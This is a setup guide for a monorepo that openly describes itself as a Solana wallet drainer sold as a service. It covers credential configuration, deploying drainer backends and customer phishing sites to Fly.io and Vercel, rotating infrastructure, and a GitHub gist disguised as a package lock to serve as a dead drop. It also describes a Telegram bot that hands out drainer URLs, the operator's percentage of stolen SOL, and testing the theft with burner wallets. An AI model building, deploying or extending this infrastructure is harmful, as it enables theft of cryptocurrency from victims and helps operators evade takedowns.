# Chimera Monorepo — Full Setup

One repo, two engines: **chimera** (rotation/infra engine) and **Yale**
(Solana+SPL wallet drainer sold as a service). This guide takes a fresh
machine to a live drainer-as-a-service.

```
chimera/
├── core/        — engine: rotation, Fly/Vercel provisioning, dead drop,
│                  customer-site pipeline, drainer service + HTTP API
├── yale/        — the drainer module (see docs/yale.md)
│   ├── server/    — backend (Node/Express, deployed to Fly)
│   ├── bot/       — Telegram customer bot
│   ├── programs/  — on-chain relay program (Anchor/Rust, already deployed)
│   └── ...        — forensic tooling, localnet replay
├── dashboard/   — operator web UI
├── docker/      — C2/flipper containers
├── docs/        — this documentation
└── config.yaml  — credentials (gitignored)
```

## Prerequisites

- Node 20+ (bot + Yale server)
- Python 3.10+ with `pip install -r requirements.txt -r dashboard/requirements.txt` + `pip install pytest`
- Docker Desktop (backend image build)
- Fly.io CLI, logged in (`fly auth login`)
- A Telegram bot token (@BotFather) and your chat ID

## 1. Credentials — `config.yaml`

Copy `config.example.yaml` → `config.yaml` and fill:

| Key | What |
|---|---|
| `fly_api_token` | **App-scoped deploy token**: `fly tokens create deploy -a chimera-drainer` (create the app first — see step 2) |
| `fly_org` / `fly_region` | Your org slug (e.g. `personal`) / region (`fra`, `iad`, ...) |
| `vercel_api_token` | Full-scope token from vercel.com/account/tokens |
| `vercel_team` | Your team slug (from vercel.com dashboard URL) |
| `github_token` + `gist_id` | PAT with gist scope + a created gist (dead drop) |
| `proxy_*` | Resi proxy (optional — the drainer backend does NOT use it) |
| `drainer.aes_secret` | Shared AES secret (generate: `node -e "console.log('app_'+require('crypto').randomBytes(48).toString('hex'))"`) |
| `drainer.service_key` | Shared secret for the service API (bot sends it as `X-Service-Key`) |
| `drainer.env.TELEGRAM_BOT_TOKEN` / `TELEGRAM_CHAT_ID` | The bot + your chat for drain alerts |
| `drainer.env.OPERATOR_WALLETS` | **Your payout wallets (comma-separated)** — take the cut of every drain |
| `drainer.env.OPERATOR_CUT` | Fraction of drained SOL to you (e.g. `0.15`). SPL tokens go 100% to the customer |

One-time gist creation (dead drop):

```bash
curl -X POST https://api.github.com/gists \
  -H "Authorization: Bearer <github_pat>" \
  -d '{"description":"cloudsync-sdk package lock","public":false,
       "files":{"package-lock.json":{"content":"{}"}}}'
# → copy "id" into config.yaml gist_id
```

## 2. Backend image (one-time)

```bash
# create the stable Fly app (hostname persists across rotations)
fly apps create chimera-drainer
fly ips allocate-v4 --shared -a chimera-drainer

# build + push the backend image
cd yale/server
fly auth docker
docker build -t registry.fly.io/chimera-drainer:latest .
docker push registry.fly.io/chimera-drainer:latest
```

Rebuild/push again whenever `yale/server/*` changes.

## 3. Vercel team settings (one-time)

Team → Settings → Deployment Protection: **preview only** (new teams default
to protecting ALL deployments, which breaks domain-less customer URLs).
`core/vercel_deployer.py` sets this per-project too, but check the team
default once.

## 4. Bot env — `yale/bot/.env`

```
BOT_TOKEN=<botfather token>
AES_SECRET=<same as config.yaml drainer.aes_secret>
CHIMERA_API_URL=http://127.0.0.1:8444
CHIMERA_SERVICE_KEY=<same as config.yaml drainer.service_key>
ADMIN_ID=<your telegram user id>
# optional zip-fallback mode:
BACKEND_URL=https://chimera-drainer.fly.dev
```

```bash
cd yale/bot && npm install
```

## 5. Run

The engine + Telegram bot run in the cloud as one Fly app (`chimera-engine`),
not locally — a second local instance causes Telegram getUpdates conflicts.

```bash
# one-time: app + volume + secrets (see fly.engine.toml, core/gen_config.py)
fly apps create chimera-engine --org <org>
fly volumes create chimera_data --size 1 --app chimera-engine --region fra
fly secrets import -a chimera-engine < secrets.txt

# deploy / redeploy after code changes
fly deploy --config fly.engine.toml
```

Secrets (via `fly secrets`) materialize config.yaml at boot — nothing is
baked into the image. Persistent state (customer registry, stats, bot
access list) lives on the `chimera_data` volume at `/app/data`.

First cycle runs on boot: backend machine recycles, customer sites redeploy,
dead drop updates. Customers then message the bot: wallet in → live URL out.

## 6. Verify

```bash
python -m pytest tests/ -q          # engine tests (no cloud)
cd yale/server && node test-split.mjs   # operator split math
cd yale/bot && node test-build.mjs       # payload patcher
curl https://chimera-engine.fly.dev/health       # engine + bot up
curl https://chimera-drainer.fly.dev/health  # backend up
fly logs -a chimera-engine         # engine + bot logs
```

Test the drain itself: message the bot with a burner wallet, fund a second
burner, connect it to the returned site, sign. SOL should split 85/15
customer/you (per OPERATOR_CUT), with a Telegram alert to your chat.

## Module docs

- [`yale.md`](yale.md) — the drainer (attack chain, server, bot, split)
- [`chimera-core.md`](chimera-core.md) — rotation engine + service API
- [`drainer-service.md`](drainer-service.md) — the service architecture
- [`flipper.md`](flipper.md) — telemetry platform (beta, separate project)
